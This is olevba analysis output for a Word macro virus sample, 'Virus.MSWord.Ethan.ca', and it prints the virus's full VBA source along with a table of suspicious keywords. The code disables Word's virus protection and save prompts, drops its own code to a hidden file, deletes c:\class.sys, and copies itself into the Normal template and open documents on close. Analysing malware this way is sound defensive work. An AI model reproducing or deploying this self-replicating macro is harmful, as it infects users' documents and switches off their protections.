olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.ca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.ca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
' Sorry Mr Ethan Frome...
' But thanks anyway...
On Error Resume Next
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Application.EnableCancelKey = Not -1

If Dir("c:\grover.___", 6) = "" Then
  Open "c:\grover.___" For Output As #1
  For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    Print #1, a
  Next i
  Close #1
  SetAttr "c:\grover.___", 6
End If

If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
  Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
  t = ""
End If

If t <> "" Then
  Open "c:\grover.___" For Input As #1
  If LOF(1) = 0 Then GoTo q
  i = 1
  Do While Not EOF(1)
    Line Input #1, a
    t.CodeModule.InsertLines i, a
    i = i + 1
  Loop
q:
  Close #1
  Kill "c:\grover.___"
End If
End Sub

Private Sub Document_New()
ActiveDocument.Content.LanguageID = wdNoProofing
ActiveDocument.Content.ParagraphFormat.Alignment = wdAlignParagraphCenter
ActiveDocument.Content.Font.NameAscii = "Arial"
ActiveDocument.Content.Font.Animation = wdAnimationShimmer
ActiveDocument.Content.Font.Bold = True
ActiveDocument.Content.Font.Size = 24
ActiveDocument.Content.Text = ActiveDocument.Content.Text + "Super Grover"
ActiveDocument.Content.LanguageID = wdEnglishUK
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

